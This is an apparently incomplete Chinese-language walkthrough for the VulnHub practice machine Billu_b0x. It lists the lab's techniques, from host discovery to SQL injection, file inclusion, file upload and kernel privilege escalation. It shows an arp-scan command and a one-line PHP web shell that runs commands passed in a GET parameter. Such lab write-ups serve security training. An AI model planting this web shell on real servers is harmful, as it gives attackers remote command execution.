> 靶机环境介绍
+ [Billu_b0x](https://download.vulnhub.com/billu/Billu_b0x.zip) 
+ 难度等级 <font color=yellow> 中 (两种攻击方式)</font>

目标:
+ 取得 root 权限

**所用技术栈**
+ 主机发现
+ 端口扫描
+ WEB 信息收集
+ SQL 注入 (SQLMAP 跑不出来)
+ 文件包含漏洞
+ 文件上传漏洞
+ 源码审计
+ 内核漏洞提权

## 主机发现与端口扫描

主机发现


```bash
sudo arp-scan -l
```


```php
<?php system($_GET["cmd"]);?>
```

